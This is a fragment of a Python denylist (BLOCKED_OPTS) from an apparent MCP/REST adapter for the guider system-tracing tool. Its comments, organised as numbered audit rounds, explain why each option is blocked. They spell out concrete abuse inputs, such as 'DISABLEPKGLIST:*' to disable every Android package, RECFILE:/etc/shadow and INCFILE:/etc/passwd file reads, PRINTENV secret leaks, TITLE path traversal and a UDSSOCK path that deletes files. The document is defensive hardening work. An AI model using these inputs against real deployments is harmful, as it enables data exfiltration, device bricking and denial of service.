    # -> SysMgr.updateEnvironVars() with NO reference to BLOCKED_OPTS/
    # BLOCKED_COMMANDS at all (that Python-side enforcement lives only in
    # the MCP adapter, not inside guider.py itself) - a two-stage attack
    # (open the door via extra_opts, then walk through it via a separate
    # local/network connection) but a genuine, currently-open
    # command-block bypass.
    "TCPSERVER", "UDSSERVER",
    # round 82: SETDEBUGGABLE/SETPROFILEABLE (AndroidMgr.doPerfetto())
    # reach the same AndroidMgr.setProp() sink the blocked "setprop"
    # command uses, fixed to "ro.debuggable"/"ro.profileable" = "true" -
    # a narrower, single-purpose subset of setprop's general capability
    # (caller can't choose property/value), but forcing a device into a
    # debuggable/profileable state is itself a meaningful security-
    # relevant primitive worth blocking defensively.
    "SETDEBUGGABLE", "SETPROFILEABLE",
    # round 71: SysMgr.parseEnvironVars() (called on EVERY guider.py
    # invocation via initEnvironment()) does `os.environ =
    # SysMgr.getEnvList()`, merging these values with no key-name
    # restriction — LD_PRELOAD/LD_LIBRARY_PATH/PATH included — then
    # executeProcess() passes that tainted env to os.execvpe() for every
    # spawned child, including the "fixed binary" AndroidMgr family
    # (pm/am/dumpsys/getprop/setenforce/atrace) rounds 69-70 treated as
    # safe purely because argv[0] is hardcoded. Since os.environ itself is
    # globally overwritten, ANY subprocess.Popen/os.system call anywhere
    # that omits env= also inherits the injected values, and $PATH-based
    # lookups for unqualified binary names become hijackable independent
    # of LD_PRELOAD. This undermines the "fixed binary = safe" assumption
    # behind dozens of previously-cleared call sites.
    "ENV", "ENVFILE", "ENVPROC", "CLEARENV",
    # round 71: dumpFileData() can be attached via -q DUMPFILE:<path>/
    # DUMPFILEB64:<path> to nearly ANY streaming command (triggered from
    # printIntervalUsage(), hit by top/ttop/atop/etc.), reading an
    # arbitrary file (or a directory's listing) and echoing it straight
    # into the response stream. The key name contains "FILE" so it's
    # already routed through _is_sensitive_path()'s denylist via
    # _filter_opts()'s generic heuristic — same as print/less — but unlike
    # those two dedicated, self-documenting commands, this rides along
    # with any ordinary monitoring call, giving it far broader practical
    # reach than the denylist's known credential-marker gaps account for.
    # Blocked outright for the same reason LLMAUDITLOG was: passing the
    # generic path heuristic isn't enough when the blast radius is "almost
    # every command" rather than one explicit one.
    "DUMPFILE", "DUMPFILEB64",
    # Registers a signal handler whose value is fed straight into
    # handleEventCmd() — the same generic event-command dispatcher every
    # option above ultimately reaches. This makes REGSIGCMD a meta-gateway:
    # blocking individual option names does not stop a value like
    # "SIGUSR1:RUNCMDLIST:evil" from smuggling in any other event-command,
    # blocked or not. Inspecting/parsing the value itself is out of scope
    # here (false-positive risk, needs its own design) — tracked as a known
    # residual gap, not something this set can close on its own.
    "REGSIGCMD",
    # round 83: AndroidMgr.runActivity()'s "-q RUNPKGLIST" 4th '#'-delimited
    # field is not a caption but a full raw argv suffix appended verbatim to
    # "am start" - injects arbitrary flags (--user, --grant-*-uri-permission,
    # -f <flags>, etc). AndroidMgr.useContent()'s "-q CONTENT" value has a
    # space after the --uri slot smuggle in additional flags like
    # "--bind KEY:TYPE:VALUE", reaching "content update --uri
    # content://settings/secure --bind ..." - the exact same capability as
    # the already-blocked SETSETTINGS (arbitrary secure/global setting
    # writes), through a completely different statement.
    # injectInputEvent()'s "-q INPUT" is multi-token by design, so the issue
    # isn't injection itself but that all three reach doPerfetto()'s
    # "COMMAND" section directly via -q, entirely bypassing andcmd's
    # main_arg-only _ANDCMD_ALLOWED_SUBCOMMANDS allowlist - satisfy the
    # precondition with main_arg="GETSELINUX" (an allowed sub-command) and
    # smuggle the actual payload through extra_opts instead.
    "RUNPKGLIST", "CONTENT", "INPUT",
    # round 83: ADDRECOPT/RMRECOPT (doSimplePerf()/doCaptureScreen(record=
    # True)) and ADDCAPOPT/RMCAPOPT (doCaptureScreen(record=False)) are
    # explicit, self-documented (the code's own comments call them "add/
    # remove raw flags") argv-suffix injection primitives for simpleperf/
    # screenrecord/screencap. scrcap/scrrec are android_only but not in
    # _REQUIRES_DEVICE_ID_COMMANDS, so they run locally with no device_id
    # at all.
    "ADDRECOPT", "RMRECOPT", "ADDCAPOPT", "RMCAPOPT",
    # round 83 [HIGH]: AndroidMgr.applySettingVars() maps these 20
    # differently-named keys to fixed (namespace, name) pairs and, when
    # given a value other than "SET", passes that value verbatim to
    # writeSetting() - the exact same sink the already-blocked SETSETTINGS
    # exists to close (arbitrary "settings put <ns> <name> <val>"), except
    # here the value itself is fully attacker-controlled rather than fixed
    # to "true" (worse than round 82's SETDEBUGGABLE/SETPROFILEABLE).
    # Reachable via scrrec (doCaptureScreen(record=True) unconditionally
    # calls applySettingVars()) or bugrep/bugrec (with NOVIDEO), no
    # device_id/root required. PACKAGEVERIFIER:0/VERIFYADBINSTALL:0/
    # INSTALLNONMARKETAPP:1/AIRPLANEMODE:1/MOBILEDATA:0 etc. are not mere
    # UI cosmetics - they genuinely lower device security posture or cause
    # a DoS.
    "SHOWTOUCH", "POINTERLOCATION", "DEBUGVIEWATTRIBUTES",
    "WINDOWANIMATION", "TRANSITIONANIMATION", "ANIMATOR",
    "AIRPLANEMODE", "MOBILEDATA", "PERMISSIONCONTROL",
    "INSTALLNONMARKETAPP", "PACKAGEVERIFIER", "VERIFYADBINSTALL",
    "SCREENOFFTIMEOUT", "SCREENBRIGHTNESS", "SCREENBRIGHTNESSMODE",
    "SCREENSTAYONPLUG", "SCREENROTATION", "SCREENUSERROTATION",
    "GPUPROFILING", "STRICTMODE",
    # round 83 [HIGH]: SysMgr.applyPriority() is invoked from several call
    # sites (doPerfetto()'s REPSCHED, createProcess()'s CHILDSCHED,
    # Debugger's TRACEESCHED, executeProcess()'s EXECSCHED) that each try to
    # force "apply to self only" by string-concatenating a trusted own-pid
    # as "%s:%s" % (userValue, trustedPid) - but applyPriority()'s colon-
    # split logic falls back to schedSet[2] as the target whenever the field
    # count isn't exactly 2 (the self-only shape). A user-supplied 3-field
    # value ("F:99:9999") makes the combined string 4 fields, so the target
    # becomes schedSet[2] (attacker-supplied "9999") while the appended
    # trusted pid is shoved into the unused schedSet[3] - achieving
    # sched_setscheduler()/setpriority() on an arbitrary pid with no event/
    # ALLOWRUN/handleEventCmd() gate at all, completely bypassing AUTOSCHED's
    # event-command gate. REPSCHED is reachable via hprof/perfetto (some
    # call sites have checkRoot=False, so no root needed either); CHILDSCHED
    # is reachable from anywhere guider forks internally (broader still);
    # TRACEESCHED is reachable from the trace-target-attach loop. EXECSCHED
    # shares the identical flaw but every guider.py call path to
    # SysMgr.executeProcess() that could trigger it sits behind an
    # already-blocked command/option, so it's not currently reachable -
    # blocked defensively anyway since it's free to close.
    # round 83: EXECSCHED shares the identical flaw but every guider.py call
    # path to SysMgr.executeProcess() that could trigger it sits behind an
    # already-blocked command/option, so it's not currently reachable —
    # blocked defensively anyway since it's free to close.
    # round 84 correction: that reachability claim was inaccurate —
    # executeProcess() (guider.py:92081, reads EXECSCHED at 92086-92087) is
    # also called directly from the unblocked logcat/logmon command's forked
    # child (guider.py:30793, 31091) and from the general-purpose
    # SysMgr.createProcess(cmd=...) helper (guider.py:92749) used throughout
    # the codebase. Doesn't change the outcome (EXECSCHED is already
    # blocked either way) — comment corrected for accuracy only.
    "REPSCHED", "CHILDSCHED", "TRACEESCHED", "EXECSCHED",
    # round 84: MOUNTCG/UMOUNTCG (bare flags, same style as APPLYCG) reach
    # the IDENTICAL sink the already-blocked "mount"/"umount" commands use —
    # SysMgr.mount()/SysMgr.umount() (raw mount(2)/umount2(2) syscall
    # wrappers, no checkRootPerm() gate in the Python wrapper itself, guider.
    # py:91034/91070) — via SysMgr.applyEnvironVars() (the same universal
    # "any command carrying a -q option" trigger round 82 already used to
    # justify blocking LIMITCPU/APPLYCG). MOUNTCG -> SysMgr.mountCgroups()
    # (guider.py:57452) mounts any not-yet-mounted cgroup subsystem.
    # UMOUNTCG -> SysMgr.umountCgroups() (guider.py:57429) is called with NO
    # target list, so its filter never excludes anything — it force-
    # unmounts EVERY currently-mounted cgroup controller on the host
    # (cpu/memory/freezer/blkio/pids/devices/etc.) with zero arguments and
    # zero precondition beyond calling any command that carries a -q option
    # at all (e.g. bare "cgtop"/"printcg", both requires_root=False) — a
    # severe, unbounded system-wide DoS (breaks any cgroup-based resource
    # control: containers, systemd slices, docker, k8s). Confirmed this is
    # not an accidental side-effect: guider's own --help text documents
    # "-q MOUNTCG"/"UMOUNTCG" as intended usage for cgtop/printcg/limitcpu-
    # family commands (guider.py:65889-65891, 74771-74773, 76279-76281).
    "MOUNTCG", "UMOUNTCG",
    # round 84 [CRITICAL, highest severity in this series]: AndroidMgr.
    # doPerfetto()'s COMMAND section (shared by andcmd/perfetto/hprof/mdtop)
    # dispatches these 5 keys through a wildcard-capable package-list loop
    # (guider.py:42437-42441 read, 42532-42564 dispatch) — UtilMgr.
    # isValidStr(x, ["*"]) (guider.py:8083/8114-8115) matches "*" against
    # EVERY installed package returned by AndroidMgr.getPkgList(), so a
    # single value of "*" applies the action to the device's entire package
    # list: CLEARPKGLIST -> AndroidMgr.clearPkg() -> "pm clear <pkg>" (wipes
    # all app data), UNINSTALLPKG -> uninstallPkg() -> "pm uninstall <pkg>"
    # (uninstalls every removable package), STOPPKGLIST -> stopActivity()
    # -> "am force-stop <pkg>" (force-kills every running app), ENABLEPKG-
    # LIST/DISABLEPKGLIST -> handlePkg() -> "pm enable/disable --user <uid>
    # <pkg>" for EVERY user profile (guider.py:40401-40416) — effectively
    # bricks the device UI, requiring a factory reset to recover. Reachable
    # via andcmd(sub_command="GETSELINUX", extra_opts=["DISABLEPKGLIST:*"])
    # — GETSELINUX satisfies _ANDCMD_ALLOWED_SUBCOMMANDS's precondition
    # while the real payload rides in via an independently-settable -q
    # option this allowlist was never designed to check. andcmd is
    # requires_root=False and not in _REQUIRES_DEVICE_ID_COMMANDS, so this
    # is reachable with literally no precondition at all.
    "CLEARPKGLIST", "UNINSTALLPKG", "STOPPKGLIST", "ENABLEPKGLIST",
    "DISABLEPKGLIST",
    # round 84 [HIGH]: same doPerfetto() COMMAND section, same
    # _ANDCMD_ALLOWED_SUBCOMMANDS-bypass shape as round 83's RUNPKGLIST/
    # CONTENT/INPUT and the CRITICAL group above — guider_adapter.py's own
    # code comment (around _ANDCMD_ALLOWED_SUBCOMMANDS) explicitly names
    # INSTALLPKG/GRANTPERM/REVOKEPERM/BROADCAST/CLEARDATA/SETSETTINGS as the
    # exact things this allowlist exists to keep out, but only SETSETTINGS
    # was actually enforced — the rest were reachable via -q the whole time.
    # BROADCAST (guider.py:42609/42626) -> AndroidMgr.broadcastIntent()
    # (40774-40783): "am broadcast <intent> --uri" + v.split(" ") — the
    # identical argument-injection shape as the already-blocked CONTENT (a
    # space in the value smuggles extra am-broadcast argv tokens, e.g.
    # "--user 0"/"-n <privileged-receiver>"/"--grant-*-uri-permission").
    # INSTALLPKG (42612/42626) -> installPkg() -> "pm install -r <path>"
    # (arbitrary APK install+replace). GRANTPERM/REVOKEPERM (42613/42614)
    # -> "pm grant/revoke <pkg> <perm>" (39995-40026, arbitrary permission
    # grant/revoke for arbitrary packages). STARTSERVICE/STOPSERVICE
    # (42615/42616) -> "am startservice/stopservice -n <component>"
    # (40029-40048, classic intent-component-abuse primitive). All six
    # single-target (not wildcard-capable like the CRITICAL group above)
    # but still a complete bypass of the allowlist they were explicitly
    # meant to be blocked by.
    "BROADCAST", "INSTALLPKG", "GRANTPERM", "REVOKEPERM", "STARTSERVICE",
    "STOPSERVICE",
    # round 84 [HIGH]: doPerfetto()'s ADDCONFIG (guider.py:43645-43646) does
    # `config += SysMgr.readFile(cf)` for every path in the value — plain
    # open(path,"r") with zero validation, and the key name contains none of
    # FILE/PATH/DIR so it bypasses _filter_opts()'s generic path heuristic
    # entirely. The accumulated content is embedded into `config` and, when
    # the bare unblocked flag SERVERTASK is also present (jsonEnable is
    # already True by default for perfetto/hprof since their catalog
    # output_type is "json"), gets echoed straight back through
    # statusDict["warn"] into the MCP/REST response
    # (extra_opts=["ADDCONFIG:/some/file","SERVERTASK"] on perfetto/hprof
    # exfiltrates an arbitrary file's contents from the target device).
    "ADDCONFIG",
    # round 84 [HIGH / MEDIUM-HIGH]: ADDREPOPT/RMREPOPT reach TWO distinct
    # "add/remove raw argv flags" sinks at once, both missed by round 83's
    # ADDRECOPT/RMRECOPT (record phase) sweep because they target a
    # DIFFERENT subcommand/phase: (1) AndroidMgr.doPerfetto()'s own
    # traceconv invocation (guider.py:44231/44233 build
    # `cmd = [binPath,"text",outPath] + ADDREPOPT` then strip RMREPOPT
    # entries, executed via SysMgr.executeCmdSync() at 44237 — reachable via
    # perfetto/hprof, needs device_id); (2) AndroidMgr.doSimplePerf()'s
    # `simpleperf report-sample` invocation (guider.py:44920/44922, same
    # add/remove-raw-flags shape, executed at 44932 — reachable via sperf,
    # runs locally without device_id per round 67's finding, or via bugrec's
    # CPUPROF re-entrant call into the same function). One BLOCKED_OPTS
    # entry per name closes both sinks at once since _filter_opts() strips
    # by option name regardless of which command/function would read it.
    "ADDREPOPT", "RMREPOPT",
    # round 84 [MEDIUM-HIGH]: AndroidMgr.doSimplePerf()'s ADDTPFILTER
    # (guider.py:44620) does `cmd = cmd + ["--tp-filter"] + addFilters`
    # (44622) before executing the simpleperf record invocation via
    # SysMgr.executeCmdSync() (44780, no shell but a raw argv list) — a
    # second (or later) comma-supplied item is not consumed as the filter
    # value and instead becomes an arbitrary extra argv flag, identical in
    # mechanism/severity to the already-blocked ADDRECOPT.
    "ADDTPFILTER",
    # round 84 [HIGH]: AndroidMgr.doBugRecord()'s TITLE (guider.py:41629)
    # feeds an UNVALIDATED path-prefix `outPath = os.path.join(outPath,
    # "%s_%s" % (lastOutPath, title + "_"))` (41631-41633) — distinct from
    # the outDir that IS validated/mkdir'd/isWritable-checked at
    # 41619-41627 — which is then reused as the write-location prefix for
    # roughly 20 different artifacts this function produces: screenshot
    # (41758), video (41781), log files (41807-41818), perf.out/
    # perf_total.out (41832/41839-41864), binder.out (41874), cpuprof
    # (41887), memprof.out (41897), tcpdump.pcap (41907), screen.out/
    # packagelist.txt/settings.txt (42037-42054), prop.txt (42063),
    # packageinfo.txt (42073), flamegraph .svg (42139), openfile.out
    # (42199-42200), and the final zip name (42277-42282). The key name
    # contains none of FILE/PATH/DIR, so it bypasses _filter_opts()'s
    # generic path-traversal check entirely — a value like
    # "TITLE:../../../../data/local/tmp/planted" causes every one of those
    # ~20 writes to land in an attacker-chosen (pre-existing) directory
    # instead of the sandboxed, already-validated report folder. bugrep/
    # bugrec run locally with no device_id/root required (round 66/68).
    "TITLE",
    # round 84 [MEDIUM]: AndroidMgr.doBugRecord()'s INCFILE (guider.py:
    # 42217-42236) resolves each value via UtilMgr.getFileList() then
    # SysMgr.copyFile()/copyDir() (42230-42236) copies the file OR ENTIRE
    # DIRECTORY TREE into the report's "custom/" subfolder, which is then
    # zipped (42284) and returned as the command's file output. The key
    # name contains FILE so it does reach _is_accessible_path(), but that
    # check only rejects _is_sensitive_path()'s narrow credential-file
    # denylist and otherwise allows any path that already exists on disk —
    # the identical residual-gap shape DUMPFILE/DUMPFILEB64 were hard-
    # blocked for in round 71 ("passing the generic path heuristic isn't
    # enough"). INCFILE:/etc/passwd or an entire app's shared_prefs
    # directory gets copied into the returned zip and exfiltrated.
    "INCFILE",
    # round 84 [MEDIUM]: seven more doPerfetto() COMMAND-section keys that
    # bypass _ANDCMD_ALLOWED_SUBCOMMANDS the same way as the HIGH group
    # above, each a single-target (not wildcard) destructive/state-changing
    # Android action: CLEARDATA (42623/42626) -> single-pkg "pm clear"
    # (still an explicit allowlist-bypass the adapter's own comment calls
    # out, even though not wildcard-capable here). FORCECLOSE (42622/42626)
    # -> "am force-stop <pkg>" (guider.py:40139-40146). TOGGLEWIFI/TOGGLEBT
    # (42620/42621) -> "svc wifi/bluetooth enable/disable" (40379-40398,
    # connectivity DoS). DUMPHEAP (42624/42626) -> "am dumpheap <pkg>
    # <outFile>" (40149-40167) with an attacker-chosen write path in a key
    # name containing none of FILE/PATH/DIR. CARKEY (42608/42626) ->
    # AndroidMgr.injectCarKey() -> "cmd car_service inject-key <code>
    # <action>" (40529-40585, injects arbitrary vehicle HW key events like
    # POWER/SLEEP/WAKEUP — a safety-adjacent risk given this codebase's
    # automotive domain). SETORIENTATION (42619/42626) -> "settings put
    # system user_rotation <val>" (40367-40376).
    "CLEARDATA", "FORCECLOSE", "TOGGLEWIFI", "TOGGLEBT", "DUMPHEAP",
    "CARKEY", "SETORIENTATION",
    # round 84 [LOW, but free to close]: six more doPerfetto() COMMAND-
    # section keys with no destructive/write/exec sink (pure read-only
    # dumpsys/debuggerd queries: GETGFXINFO, GETWINDOWINFO, GETACTLIST,
    # GETACTSTAT, GETPERMLIST, GETDUMPLIST), but each still bypasses
    # andcmd's deliberately narrow 6-item diagnostic allowlist
    # (_ANDCMD_ALLOWED_SUBCOMMANDS: GETSELINUX/GETPKGLIST/GETPROCLIST/
    # GETBINDERSTATS/GETAPPSTAT/GETPKGATTR) — GETAPPSTAT/GETPKGATTR
    # themselves are deliberately excluded from this set since they're
    # already legitimately exposed via main_arg, so blocking their -q form
    # wouldn't reduce any exposure. Blocking the other six costs nothing
    # and keeps the allowlist's "only these 6 are safe to expose" intent
    # actually true rather than silently widened by an unrelated -q option.
    "GETGFXINFO", "GETWINDOWINFO", "GETACTLIST", "GETACTSTAT",
    "GETPERMLIST", "GETDUMPLIST",
    # round 85 [HIGH]: SysMgr.applyEnvironVars() (guider.py:87109-87486, the
    # universal "any command carrying a -q option" trigger that already
    # yielded LIMITCPU-family/APPLYCG (round 82) and MOUNTCG/UMOUNTCG
    # (round 84) via accidental one-at-a-time tracing) was swept exhaustively
    # this round. PRINTENV (87357) unconditionally calls SysMgr.printEnv()
    # whenever applyEnvironVars() runs at all, which prints os.environ to
    # stderr (92079-92083) — guider_adapter.py's _exec() runs the subprocess
    # with no env= override, so the guider child inherits the FULL
    # environment of the MCP/REST server process itself, and _exec()
    # unconditionally appends up to 500 bytes of subprocess stderr to the
    # response's "warnings" list with no secret-scrubbing. A bare
    # "-q PRINTENV" on any unblocked command (e.g. plain "top") with zero
    # other precondition can leak whatever credentials/API keys/tokens are
    # set in the deployment's own environment.
    "PRINTENV",
    # round 85 [MEDIUM-HIGH]: same applyEnvironVars() sweep. LIMITDIR/
    # LIMITDIRCNT/LIMITDIRINIT/LIMITDIREXIT (87194-87278) reach
    # SysMgr.cleanupDirs() -> freeDirs()/freeDirsCnt() (83157-83290),
    # os.remove()-ing files in a target directory until a caller-chosen
    # size/count threshold is met — a small threshold (e.g. "1") deletes
    # effectively everything in the directory. The key names contain "DIR"
    # so they do reach _is_accessible_path(), but that check accepts any
    # "/tmp/"-prefixed value with no existence requirement, so /tmp-rooted
    # targets (a location commonly shared with other processes' sockets/
    # lockfiles/scratch data) are fully exposed. KEEPREPDIRFILECNT is the
    # same feature's retention-count knob (no path of its own, but part of
    # the identical deletion chain). LIMITREPDIR/REMOVEREPDIR/
    # REMOVEEXREPDIR/REMOVENOREP reach the sibling
    # SysMgr.freeReportDir() sink (shutil.rmtree() at 83066, os.remove() at
    # 83124) — currently these four are only accidentally not exploitable
    # through the adapter (LIMITREPDIR's value is a bare size string, not a
    # path, and REMOVEREPDIR/REMOVEEXREPDIR compare against basenames
    # rather than full paths, so the /tmp/-prefix heuristic rarely matches
    # in practice), but that's incidental rather than by design, so they're
    # closed deliberately alongside the group rather than relied upon to
    # keep failing by luck.
    "LIMITDIR", "LIMITDIRCNT", "LIMITDIRINIT", "LIMITDIREXIT",
    "KEEPREPDIRFILECNT", "LIMITREPDIR", "REMOVEREPDIR", "REMOVEEXREPDIR",
    "REMOVENOREP",
    # round 85 [MEDIUM-HIGH]: same sweep. MKPIDFILE (87408-87413) does
    # SysMgr.writeFile(pidPath, str(SysMgr.pid), truncate=True) with no
    # validation of its own. The key name contains "FILE" so it reaches
    # _is_accessible_path(), but that check accepts EITHER a "/tmp/"-
    # prefixed value (need not exist, enabling new file+directory creation
    # anywhere under /tmp) OR any value that already exists on disk
    # ANYWHERE on the filesystem with no /tmp scoping at all — letting a
    # caller silently truncate and overwrite any existing, guider-writable
    # file on the host with guider's own PID string. Content isn't
    # attacker-chosen, but unconditional destruction of the target's
    # original content is a genuine integrity/DoS primitive.
    "MKPIDFILE",
    # round 85 [MEDIUM-HIGH]: same sweep, independently re-confirmed by a
    # follow-up investigation into round 84's own deferred "MVREPDIR/
    # CPREPDIR needs re-checking" note. Read at guider.py:87253-87270,
    # stored into SysMgr.mvRepDir/cpRepDir, then SysMgr.manageFile()
    # (50601-50646) copies/moves guider's own already-produced report
    # file/archive there via SysMgr.copyFile()/moveFiles() at process exit
    # — the destination validation is identical to the already-blocked
    # DUPOUTPATH sibling in the very same closeAllForPrint() function
    # (111040-111061): "must already exist" is the only check (also
    # satisfied by the adapter's /tmp/-prefix heuristic), with no
    # allowlist/_is_sensitive_path()-style restriction on the destination
    # at all. copyFile()'s fallback path additionally os.chmod()s the new
    # copy to 0o777, leaving a world-writable copy of the report behind.
    # Reach is broader than just bugrep/bugrec: manageFile() is also called
    # from SysMgr.closeAllForPrint() (111072), the generic exit-time path
    # shared by essentially any command that writes output through a -o
    # path via printPipe() — so "-q MVREPDIR:<existing dir>" on nearly any
    # recording/monitoring command redirects/duplicates its own output
    # there.
    "MVREPDIR", "CPREPDIR",
    # round 85 [MEDIUM]: AndroidMgr.doPerfetto()'s protobuf-text trace
    # config (guider.py:43626-43667, assembled entirely via plain Python
    # %-formatting/string concatenation, then written raw to the perfetto
    # binary's stdin at 43920 — confirmed there is no real protobuf
    # message-builder anywhere in this path, so nothing is auto-escaped)
    # embeds these keys' values directly into bare/numeric or quoted-string
    # protobuf-text fields with zero escaping or type validation: BLOCKTO
    # (43106/43109, bare numeric field), CPUFREQ/CPUFREQPOLL and
    # THERMAL/THERMALPOLL (via the shared _getEnvironPoll() helper at
    # 42308-42314 and its call sites at 43308-43318/43693-43704 — the
    # helper reads CPUFREQ's/THERMAL's OWN value for a "PREFIX:" form
    # before falling back to CPUFREQPOLL/THERMALPOLL, so both members of
    # each pair must be blocked to fully close it), ARTMETHOD/ARTLEVEL
    # (same _getEnvironPoll() shape, 43733-43753), OOMTIMEOUT
    # (43587-43619, bare field), TRIGGER/TRIGGERMODE/TRIGGERTIMEOUT
    # (43795-43811, TRIGGER is a quoted-string field, the other two are
    # bare fields), SYSPROP (43763-43775, quoted-string field — confirmed
    # unrelated to AndroidMgr.setProp()'s already-blocked SETDEBUGGABLE/
    # SETSETTINGS sink; this is a read-only perfetto data source that
    # samples the NAMED property's value into the trace, it does not write
    # any property), FTRACE (43397-43411/43646, quoted-string field —
    # confirmed unrelated to real tracefs writes; purely a perfetto
    # linux.ftrace data-source event-name string), and ANDLOGTAG/ANDLOGID
    # (43470-43477, quoted-string and bare fields respectively). A value
    # containing a literal quote or newline breaks out of its intended
    # field and injects arbitrary additional data_sources{}/trigger_config{}
    # blocks into the trace config — bounded to Perfetto's own config
    # schema (no direct exec/file-write primitive; guider's own
    # traceconv/_runTraceProcessor() re-analysis paths are independently
    # gated by the already-blocked TRACECONV/TRACEPROCESSOR and never
    # re-read these values), so this is scoped as MEDIUM rather than
    # HIGH/CRITICAL. CPUFREQ/THERMAL/ARTMETHOD also double as the boolean
    # gate that enables their respective perfetto data source at all, so
    # blocking them costs MCP callers the ability to request CPU-frequency/
    # thermal/ART-method tracing via perfetto — the same "block outright
    # rather than partially sanitize" tradeoff this series already made for
    # DESC/SETDEBUG, chosen again here since partial sanitization of a
    # protobuf-text field risks introducing a new, subtler escaping bug.
    "BLOCKTO", "CPUFREQ", "CPUFREQPOLL", "THERMAL", "THERMALPOLL",
    "ARTMETHOD", "ARTLEVEL", "OOMTIMEOUT", "TRIGGER", "TRIGGERMODE",
    "TRIGGERTIMEOUT", "SYSPROP", "FTRACE", "ANDLOGTAG", "ANDLOGID",
    # round 87 [MEDIUM]: SysMgr.doTrace()'s PRELOAD/PRELOADLIST
    # (guider.py:99585-99594) open an arbitrary caller-supplied path via
    # ElfAnalyzer.getObject()/Debugger.loadElfList() and parse it as an ELF
    # binary — a path-existence/readability oracle plus partial content
    # disclosure (symbol/string-table content surfaces in diagnostic output
    # for valid ELF targets) for the same 12 commands
    # _MAIN_ARG_SPAWNS_PROCESS_COMMANDS blocks main_arg for. Neither key
    # name contains FILE/PATH/DIR, so both bypass _filter_opts()'s generic
    # path heuristic entirely — the same "key name evades the substring
    # check" class as LLMAUDITLOG/RALIST.
    "PRELOAD", "PRELOADLIST",
    # round 87 [MEDIUM]: BpfMgr._canParseDbc() (shared by cantop/cansnoop's
    # -q DBCFILE, guider.py:151524/151536) does open(path, encoding="utf-8",
    # errors="replace") with no size/type restriction at all. The key name
    # contains "FILE" so it does reach _is_accessible_path(), but that check
    # only rejects a narrow credential-file denylist and otherwise allows
    # any path that already exists — pointing it at a special file like
    # /dev/zero (exists, not sensitive) causes an unbounded single-line read
    # (no line terminator ever appears) that grows memory without limit
    # until the adapter's subprocess timeout or an OOM kill; a real DBC-
    # formatted file's message/signal names also surface in tool output.
    # cantop/cansnoop are both requires_root=False, android_only=False — no
    # precondition at all.
    "DBCFILE",
    # round 87 [LOW, but structurally significant]: BpfMgr.doBpfblktopCmd()'s
    # DEVFILTER (guider.py:143590/143594) is concatenated unsanitized as
    # "/dev/%s" % value before os.stat() — a value like "../../etc/shadow"
    # resolves outside /dev entirely, giving a file-existence/accessibility
    # oracle for an arbitrary absolute path via directory traversal. More
    # importantly, "DEVFILTER" contains none of "FILE"/"PATH"/"DIR" as a
    # substring (spelled out: D-E-V-F-I-L-T-E-R has "FILT", not "FILE"),
    # so it bypasses _filter_opts()'s generic path check entirely - the
    # same evasion class as PRELOAD/PRELOADLIST above, but notable because
    # it demonstrates the heuristic has a structural blind spot for any
    # "*FILTER"-suffixed key that happens to carry a path-like value
    # (flagged for a possible future broader audit, not fixed generically
    # here). bpfblktop is requires_root=True.
    "DEVFILTER",
    # round 90 [HIGH]: LogMgr.printAndLog() (the printand command) is
    # catalogued as "offline; use -I logcat.txt", but the code itself falls
    # through to a LIVE logcat-capture branch (guider.py:30190's
    # "if SysMgr.inputParam:" vs "else:") whenever input_file is omitted.
    # In that live branch, RAWFILE's value either becomes logcat's own
    # output-file argv element (guider.py:30765, "-f", RAWFILE value, when
    # DIRECT is also set) or is passed to SysMgr.redirectFd(fname, 1)
    # (guider.py:30767) to redirect the child's stdout — the exact same
    # redirectFd() sink already blocked for STDIN/STDOUT/STDERR in round 81,
    # just recurring under a different key name. printand is
    # requires_root=False, android_only=False, so
    # runCommand(command="printand", extra_opts=["RAWFILE:/tmp/target",
    # "DIRECT"]) (input_file omitted) reproduces this with no precondition
    # at all.
    "RAWFILE",
    # round 90 [LOW, defensive]: Debugger.loadPyLib() (guider.py:166183-
    # 166199) passes LIBPYTHON's value unvalidated to self.dlopen(lib) — the
    # exact same "dlopen'd shared library constructor runs on load" class
    # already blocked for LIBDLT/LIBLLVM in round 70. Its only two call
    # sites are inside the SysMgr.customCmd-driven remote command
    # interpreter ("thread"/"pystr"/"pyfile" subcommands of remote/hook
    # mode), and customCmd is still only settable via the raw "-c" CLI flag
    # (never emitted by the adapter, reconfirmed in round 89) — so this is
    # not independently reachable today. Blocked anyway per the round-83
    # EXECSCHED precedent: free to close, same rationale as LIBDLT/LIBLLVM.
    "LIBPYTHON",
    # round 91 [CRITICAL]: TaskAnalyzer's top-family mode dispatch
    # (guider.py:194706-194710) unconditionally calls
    # NetworkMgr.setServerNetwork(None, None, ...) for every mode NOT
    # individually special-cased (slabtop/vtop/cgtop/gfxtop/oomtop/swaptop/
    # leaktop) — i.e. plain top/ttop/ntop/ptop/atop/wtop/mtop/disktop/
    # stacktop/contop, the most commonly used commands in this toolkit —
    # whenever the raw "-x" CLI flag (never emitted by the adapter) is
    # absent, which for every MCP/REST call is always. setServerNetwork()
    # (guider.py:14611) unconditionally honors "-q UDSSOCK:<path>" over its
    # own ip/port arguments (14632-14638), and NetworkMgr.__init__()
    # (13279-13341) then does "if os.path.exists(self.path): if not
    # SysMgr.parentPid: os.remove(self.path)" before binding a new UNIX
    # domain socket there — SysMgr.parentPid defaults to 0 (49137) and is
    # only ever set in a fork/restart context that never occurs in a single
    # MCP/REST invocation, so the existing-file-delete branch always fires
    # when the target path already exists, regardless of whether it's
    # actually a stale guider socket. A companion "-q SETUDSMASK:<octal>"
    # (or bare NOUDSMASK -> 0o777) then chmods the newly-created socket file
    # to an attacker-chosen mode. The key name contains none of
    # "FILE"/"PATH"/"DIR", so it bypasses _filter_opts()'s generic path
    # heuristic entirely (same structural blind spot as round 87's
    # DEVFILTER). requires_root=False top has zero precondition:
    # runCommand(command="top", extra_opts=["UDSSOCK:/etc/cron.d/evil"])
    # reproduces this immediately. SETUDSMASK/NOUDSMASK are structurally
    # inert without UDSSOCK (the uds branch never runs), so blocking
    # UDSSOCK alone is sufficient — same reasoning as round 90's DIRECT.
    "UDSSOCK",
    # round 91 [HIGH]: TaskAnalyzer.saveFileData() (guider.py:226867-226928)
    # is called from the same per-interval stat-collection routine every
    # persistent top-family command shares (guider.py:227612-227614, fires
    # unconditionally once self.prevMemData is set — i.e. from the second
    # tick onward for virtually any ongoing monitoring session). "-q
    # RECFILE:<path>" makes it, every single interval, either
    # SysMgr.readFile(path, size, tail) an arbitrary file's content (size
    # defaults to "read the whole file" when unset) or os.listdir() an
    # arbitrary directory, and embed the result directly into the report
    # output — reproducible via any plain top-family command with no other
    # precondition (e.g. RECFILE:/etc/shadow). RECFILESIZE is separately
    # coerced through UtilMgr.getEnvironNum() and is numeric-only, so it is
    # not listed here.
    "RECFILE",
